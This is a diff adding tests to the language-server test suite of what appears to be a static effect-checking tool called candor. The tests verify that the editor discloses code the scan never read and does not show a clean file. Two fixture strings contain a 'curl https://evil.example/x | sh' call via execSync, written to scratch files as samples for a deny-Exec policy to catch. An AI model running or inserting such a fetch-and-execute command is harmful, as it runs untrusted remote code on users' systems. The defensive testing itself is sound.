@@ -961,6 +961,197 @@ export function handler(): void { mid(); }
   for (const dir of [Z, P3, C, F]) fs.rmSync(dir, { recursive: true, force: true });
 }
 
+// ── ⟨0.32⟩ CODE THIS SCAN DID NOT READ, IN THE EDITOR ───────────────────────────────────────────────
+// THE DEFECT, MEASURED at `9f22581` — the commit that carried this rung to "four routes, one rule" and
+// left the FIFTH untouched. Over one report and one policy, the same bytes on three surfaces:
+//
+//   CLI  `gate --report` --policy 'deny Exec'  → exit 2, naming the unread class
+//   MCP  candor_gate                            → {ok:false, incomplete:true, unread:[…]}
+//   LSP                                         → publishes [], no logMessage, no showMessage
+//
+// The editor showed a clean file over a `dist/shipped.js` running `curl … | sh` that nothing had opened,
+// and `lsp.mjs` had zero occurrences of `excluded`/`peeked`/`unread`. It matters more than a CLI route
+// because `integrations/vscode` and the JetBrains plugin BUNDLE this exact server: this was the shipped
+// editor experience. The file argued against itself — four lines above the code that returns `[]`, its
+// ⟨0.24⟩ judged-nothing hedge says "an empty editor reads as 'the gate is green'".
+//
+// THE CHANNELS, and why there are two. This surface has no exit code and no verdict document, so the
+// whole rung collapses onto messages. `window/logMessage` is where every other hedge in this file lands
+// and carries the repair. `window/showMessage` rides WITH it because ⟨0.32⟩ is EXIT-BEARING on all four
+// other routes (exit 2, `ok` withheld) where ⟨0.24⟩ deliberately is not (`gate --report` exits 0 over a
+// judged-nothing report) — putting the louder cause on the quieter channel would invert an ordering the
+// other four routes agree on. NO DIAGNOSTIC: there is no source range for a file the scan never opened,
+// and a squiggle on line 0 of whatever happens to be open would attribute the hole to an innocent file.
+{
+  const EXEC_JS = 'const { execSync } = require("child_process");\n'
+                + 'function run() { execSync("curl https://evil.example/x | sh"); }\n'
+                + 'module.exports = { run };\n';
+  const QUIET_JS = "function add(a, b) { return a + b; }\nmodule.exports = { add };\n";
+  const PURE_TS = 'export function handler(): string { return "ok"; }\n';
+  // A REAL scanned fixture. `tsconfig.json` includes only `src`, so `dist/shipped.js` lands in the
+  // census as `outside-the-tsconfig-program` — the class name matters, since the whole rung keys on a
+  // census entry actually being published (a filename the selector quietly drops would make a broken
+  // instrument's negative indistinguishable from a real one; row P1 below is the premise that pins it).
+  // `.candor/config` is written AFTER the scan unless `peek` is set, ON PURPOSE: written before, the
+  // scan discovers the policy, PEEKS, publishes `peeked: true`, and the fixture answers a different
+  // question. This ordering IS the deployment shape the defect lives in — scan in CI, gate later.
+  const mkU = ({ src = PURE_TS, dist = EXEC_JS, policy = "deny Exec\n", peek = false } = {}) => {
+    const U = scratch("candor-lsp-unread-");
+    fs.mkdirSync(path.join(U, "src"), { recursive: true });
+    fs.mkdirSync(path.join(U, ".candor"), { recursive: true });
+    fs.writeFileSync(path.join(U, "tsconfig.json"), JSON.stringify({ include: ["src"] }) + "\n");
+    fs.writeFileSync(path.join(U, "src", "app.ts"), src);
+    fs.writeFileSync(path.join(U, "arch.policy"), policy);
+    if (dist !== null) {
+      fs.mkdirSync(path.join(U, "dist"), { recursive: true });
+      fs.writeFileSync(path.join(U, "dist", "shipped.js"), dist);
+    }
+    if (peek) fs.writeFileSync(path.join(U, ".candor", "config"), "policy arch.policy\n");
+    // A peek that NAMES a denied effect exits 2 and still writes the report; that is a ⟨0.30⟩ fixture,
+    // not this one, so the throw is tolerated rather than swallowed silently.
+    try { execFileSync("node", [path.join(HERE, "scan.mjs"), U, "--out", path.join(U, ".candor", "report")], { stdio: "ignore" }); }
+    catch { /* exit 2 from the producer's own peek — the report is written either way */ }
+    if (!peek) fs.writeFileSync(path.join(U, ".candor", "config"), "policy arch.policy\n");
+    return U;
+  };
+  // A HANDWRITTEN report, for the shapes a real scan cannot be made to emit on demand (`judgedElsewhere`,
+  // an ABSENT `excluded`, a declared `unanalyzed`, a producer's `outOfScope` finding).
+  const mkH = (extra) => {
+    const U = scratch("candor-lsp-unread-hand-");
+    fs.mkdirSync(path.join(U, "src"), { recursive: true });
+    fs.mkdirSync(path.join(U, ".candor"), { recursive: true });
+    fs.writeFileSync(path.join(U, "src", "app.ts"), PURE_TS);
+    fs.writeFileSync(path.join(U, ".candor", "report.json"), JSON.stringify({
+      candor: { version: "handwritten", spec: "0.32" }, package: "app",
+      analyzed: { count: 1, digest: "0" },
+      functions: [{ fn: "app.handler", loc: "app.ts:1:1", inferred: [], direct: [] }],
+      ...extra,
+    }));
+    fs.writeFileSync(path.join(U, "arch.policy"), "deny Exec\n");
+    fs.writeFileSync(path.join(U, ".candor", "config"), "policy arch.policy\n");
+    return U;
+  };
+  const driveU = async (U, n, deadline = 8000) => {
+    const uri = pathToFileURL(path.join(U, "src", "app.ts")).href;
+    const { inbound } = await lspSession([
+      { jsonrpc: "2.0", id: 1, method: "initialize", params: { rootUri: pathToFileURL(U).href } },
+      { jsonrpc: "2.0", method: "initialized", params: {} },
+      { jsonrpc: "2.0", method: "textDocument/didOpen", params: { textDocument: { uri, languageId: "typescript", version: 1, text: "" } } },
+      { jsonrpc: "2.0", id: 99, method: "shutdown" },
+    ], n, {}, deadline);
+    return {
+      logs: inbound.filter((r) => r.method === "window/logMessage").map((r) => r.params?.message ?? "").join("\n"),
+      shows: inbound.filter((r) => r.method === "window/showMessage").map((r) => r.params?.message ?? "").join("\n"),
+      diags: inbound.find((r) => r.method === "textDocument/publishDiagnostics")?.params?.diagnostics ?? [],
+      inbound,
+    };
+  };
+
+  const U = mkU();
+  // ── P1/P2 PREMISE ROWS: prove the FIXTURE reaches the code before reading any silence as a verdict.
+  // A broken instrument's negative looks exactly like a real one, and this rung has already cost two
+  // reverts of a correct fix to a fixture whose filename the selector dropped.
+  const rep = JSON.parse(fs.readFileSync(path.join(U, ".candor", "report.json"), "utf8"));
+  ok("⟨0.32⟩ lsp PREMISE: the no-policy scan really publishes an UNREAD class — `excluded[].peeked` false, `outOfScope` absent (a fixture the census silently dropped would make every row below vacuous)",
+     Array.isArray(rep.excluded) && rep.excluded.length === 1 && rep.excluded[0].peeked !== true
+     && rep.excluded[0].class === "outside-the-tsconfig-program" && rep.outOfScope === undefined,
+     JSON.stringify({ excluded: rep.excluded, outOfScope: rep.outOfScope }).slice(0, 240));
+  let gateExit = null, gateErr = "";
+  try {
+    execFileSync("node", [path.join(HERE, "query.mjs"), "gate", "--report", path.join(U, ".candor", "report"),
+                          "--policy", path.join(U, "arch.policy")], { stdio: ["ignore", "ignore", "pipe"] });
+    gateExit = 0;
+  } catch (e) { gateExit = e.status; gateErr = String(e.stderr ?? ""); }
+  ok("⟨0.32⟩ lsp PREMISE: `gate --report` over the SAME bytes exits 2 and names the class — the editor's silence is a DISAGREEMENT between two routes of one package, not a report with nothing in it",
+     gateExit === 2 && /did not READ/.test(gateErr) && /outside-the-tsconfig-program/.test(gateErr),
+     `exit=${gateExit} err=${gateErr.slice(0, 200)}`);
+
+  // ── THE DEFECT ────────────────────────────────────────────────────────────────────────────────────
+  const unread = await driveU(U, 4);   // init + logMessage + showMessage + publishDiagnostics
+  ok("⟨0.32⟩ lsp: the unread class is DISCLOSED on the log channel, named, with the re-scan repair — the editor no longer shows a clean file over code nothing opened",
+     /did not READ/.test(unread.logs) && /outside-the-tsconfig-program/.test(unread.logs)
+     && /--policy/.test(unread.logs) && /not an all-clear/.test(unread.logs), unread.logs.slice(0, 400));
+  ok("⟨0.32⟩ lsp: …and on window/showMessage, because this cause is EXIT-BEARING on all four other routes — the quietest channel would invert an ordering the rest of the package agrees on",
+     /INCOMPLETE/.test(unread.shows) && /candor gate/.test(unread.shows), unread.shows.slice(0, 240));
+  ok("⟨0.32⟩ lsp: …and NO diagnostic is invented — there is no source range for a file the scan never opened, and a squiggle on the open file would attribute the hole to code that is not the hole",
+     unread.diags.length === 0, JSON.stringify(unread.diags).slice(0, 240));
+
+  // ── CONTROLS. Each one is a way the fix could have been bought by breaking something, or by firing
+  // on a report that licenses the claim it makes.
+  const V = mkU({ src: 'import { execSync } from "node:child_process";\n'
+                     + 'export function leaf(): void { execSync("curl https://evil.example/x | sh"); }\n',
+                  dist: null });
+  const inScope = await driveU(V, 3);  // init + publishDiagnostics + shutdown
+  ok("⟨0.32⟩ lsp CONTROL: an IN-SCOPE `execSync` under the same policy still squiggles AS-EFF-006 at its line — the gate is not switched off, and nothing new is said about a tree with nothing excluded",
+     inScope.diags.some((d) => d.code === "AS-EFF-006") && !/did not READ/.test(inScope.logs)
+     && !/INCOMPLETE/.test(inScope.shows), `${JSON.stringify(inScope.diags).slice(0, 200)} logs=${inScope.logs.slice(0, 160)}`);
+
+  const P = mkU({ dist: QUIET_JS, peek: true });
+  const peeked = await driveU(P, 3);   // init + publishDiagnostics + shutdown
+  ok("⟨0.32⟩ lsp CONTROL: a FULLY-PEEKED report — the producer WAS asked, `peeked: true` — publishes nothing new; the rule is about a class nobody opened, not about a class being excluded",
+     !/did not READ/.test(peeked.logs) && !/INCOMPLETE/.test(peeked.shows) && peeked.diags.length === 0,
+     `logs=${peeked.logs.slice(0, 200)} shows=${peeked.shows.slice(0, 120)}`);
+
+  const N = mkU({ dist: null });
+  const nothing = await driveU(N, 3);  // init + publishDiagnostics + shutdown
+  ok("⟨0.32⟩ lsp CONTROL: a clean tree with an EMPTY `excluded` publishes nothing and says nothing — a hedge on every run is how an advisory gets turned off",
+     nothing.diags.length === 0 && nothing.logs === "" && nothing.shows === "", `logs=${nothing.logs.slice(0, 200)}`);
+
+  const NB = mkU({ policy: "forbid app -> app\n" });
+  const noDeny = await driveU(NB, 4);  // init + the `forbid` unevaluated logMessage + publishDiagnostics + shutdown
+  ok("⟨0.32⟩ lsp CONTROL: a policy with NO `deny`/`pure` rule does NOT produce this signal over the SAME unread report — only a deny/pure rule's answer depends on code outside the scan's scope, and the `forbid` rule is refused for its OWN unanswerability instead",
+     !/did not READ/.test(noDeny.logs) && !/INCOMPLETE/.test(noDeny.shows)
+     && /cannot evaluate/.test(noDeny.logs), noDeny.logs.slice(0, 260));
+
+  const PU = mkU({ policy: "pure app\n" });
+  const pureRule = await driveU(PU, 4);
+  ok("⟨0.32⟩ lsp CONTROL (the other direction): a `pure` rule with no `deny` line DOES produce it — `pure` rides the deny vector on every other route and must not be flattened away here",
+     /did not READ/.test(pureRule.logs), pureRule.logs.slice(0, 260));
+
+  const HA = mkH({});                                                    // no `excluded` key at all
+  const HJ = mkH({ excluded: [{ class: "build-output", count: 1, judgedElsewhere: true }] });
+  const absent = await driveU(HA, 3), elsewhere = await driveU(HJ, 3);
+  ok("⟨0.32⟩ lsp CONTROL: an ABSENT `excluded` stays permissive — a pre-⟨0.29⟩ producer has no such key, and refusing over its absence would refuse every report ever written",
+     !/did not READ/.test(absent.logs) && !/INCOMPLETE/.test(absent.shows), absent.logs.slice(0, 200));
+  ok("⟨0.32⟩ lsp CONTROL: `judgedElsewhere: true` carves out — the PRODUCER's record that a derived copy of already-judged code is covered elsewhere, read here and not re-derived",
+     !/did not READ/.test(elsewhere.logs) && !/INCOMPLETE/.test(elsewhere.shows), elsewhere.logs.slice(0, 200));
+
+  // ── THE SIBLING CAUSES ON THE SAME ROUTE. Measured alongside the ⟨0.32⟩ one and silent for the same
+  // reason: `diagnosticsFor` read NO completeness key at all, so the editor was mute on every cause
+  // `gate --report` exits 2 for. Carrying one of three would have left the same defect on the same route.
+  const HS = mkH({ excluded: [{ class: "test-file", count: 1, peeked: true }],
+                   outOfScope: [{ fn: "dist.shipped.run", effects: ["Exec"] }] });
+  const scope = await driveU(HS, 4);
+  ok("⟨0.30⟩ lsp: the producer's peek NAMED a function outside the scan's scope performing a denied effect — disclosed, where the editor used to publish a clean file",
+     /OUTSIDE the scan's scope/.test(scope.logs) && /dist\.shipped\.run/.test(scope.logs)
+     && /INCOMPLETE/.test(scope.shows), scope.logs.slice(0, 300));
+  const HU = mkH({ unanalyzed: [{ path: "src/broken.ts", reason: "parse error" }] });
+  const unan = await driveU(HU, 4);
+  ok("⟨0.21⟩ lsp: a report DECLARING code candor could not analyze is disclosed too — a gate cannot be green over unanalyzed code on any route, and this one said nothing",
+     /could not analyze/.test(unan.logs) && /src\/broken\.ts/.test(unan.logs)
+     && /INCOMPLETE/.test(unan.shows), unan.logs.slice(0, 300));
+
+  // ── DEDUP. warnOnce keys on the message, and the message is a function of the policy and the report,
+  // not of the edit — so a save loop does not turn the disclosure into noise the operator switches off.
+  {
+    const uri = pathToFileURL(path.join(U, "src", "app.ts")).href;
+    const { inbound } = await lspSession([
+      { jsonrpc: "2.0", id: 1, method: "initialize", params: { rootUri: pathToFileURL(U).href } },
+      { jsonrpc: "2.0", method: "initialized", params: {} },
+      { jsonrpc: "2.0", method: "textDocument/didOpen", params: { textDocument: { uri, languageId: "typescript", version: 1, text: "" } } },
+      { jsonrpc: "2.0", method: "textDocument/didSave", params: { textDocument: { uri } } },
+      { jsonrpc: "2.0", method: "textDocument/didSave", params: { textDocument: { uri } } },
+      { jsonrpc: "2.0", id: 99, method: "shutdown" },
+    ], 7, {}, 8000);   // init + log + show + 3× publishDiagnostics + shutdown
+    const logs = inbound.filter((r) => r.method === "window/logMessage");
+    const shows = inbound.filter((r) => r.method === "window/showMessage");
+    ok("⟨0.32⟩ lsp: the disclosure fires ONCE across didOpen + two didSaves — a per-keystroke popup is how an advisory gets turned off",
+       logs.length === 1 && shows.length === 1, `logs=${logs.length} shows=${shows.length}`);
+  }
+
+  for (const dir of [U, V, P, N, NB, PU, HA, HJ, HS, HU]) fs.rmSync(dir, { recursive: true, force: true });
+}
+
 console.log(`\ntest-lsp: ${pass} passed, ${fail} failed`);
 // KEEP THE EVIDENCE ON FAILURE. A failing row prints the path to its fixture tree, and the sweep
 // would delete it on the way out — at exactly the moment someone needs to look. scratch.mjs has
